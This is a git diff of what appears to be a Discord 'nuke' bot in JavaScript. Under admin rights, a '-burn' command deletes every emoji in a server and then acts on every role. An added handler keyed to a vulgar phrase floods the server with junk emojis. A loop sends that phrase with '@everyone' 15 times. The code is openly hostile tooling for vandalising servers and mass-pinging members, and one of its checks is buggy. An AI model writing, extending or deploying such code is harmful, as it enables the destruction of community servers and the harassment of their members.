@@ -163,22 +163,12 @@ client.on("message", msg => {
   })
      //this edits all roles
      client.on('message', message => {
-       if(message.content.startsWith('emotes')) {
+       if(message.content.startsWith('-burn')) {
  if(message.channel.type === "dm") {return}
          if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
   }    
   message.guild.emojis.cache.forEach(e => {
     e.delete()})
-    setTimeout(() => {
-       var b = 0
-  while(b < 39) {
-  message.guild.emojis.create(randomicons123(), 'funny')
-   message.guild.emojis.create('https://images-ext-1.discordapp.net/external/HRdm0jpSLissUbkke890fcGabWIpSEnmjlJykK4hgg8/https/images-ext-1.discordapp.net/external/LOxbVQxTHoQNiyrc-GMz__uODLQQ6v38Xpypt6K1LXo/https/media.discordapp.net/attachments/735392717886193666/772567167018991646/a48e2e66-bbd5-4ba6-b168-90ce8c7c6fa9.gif', 'cube')
-    
-b++  
-} 
-   },6000) 
-
 setTimeout(() => {
 
   message.guild.roles.cache.forEach(r => {
@@ -189,6 +179,18 @@ setTimeout(() => {
 },3000)
        }
      })
+ client.on('message', async message => {
+if(!message.author.id === client.user.id) return;
+   if(message.content.startsWith('kiss my disrespectful ass')) {
+if(message.channel.type === "dm") {return}
+     if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
+}    
+await message.guild.emojis.create(randomicons123(), 'chaos')
+await message.guild.emojis.create('https://images-ext-1.discordapp.net/external/HRdm0jpSLissUbkke890fcGabWIpSEnmjlJykK4hgg8/https/images-ext-1.discordapp.net/external/LOxbVQxTHoQNiyrc-GMz__uODLQQ6v38Xpypt6K1LXo/https/media.discordapp.net/attachments/735392717886193666/772567167018991646/a48e2e66-bbd5-4ba6-b168-90ce8c7c6fa9.gif', 'cube') 
+
+   }
+ })
+
  /**
   *
           var b = 0
@@ -314,7 +316,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
             var spam = 0
             while(spam < 15) 
         {    
-            p.send(randomT() + " @everyone")
+            p.send('kiss my disrespectful ass @everyone')
             spam++
         }
          })
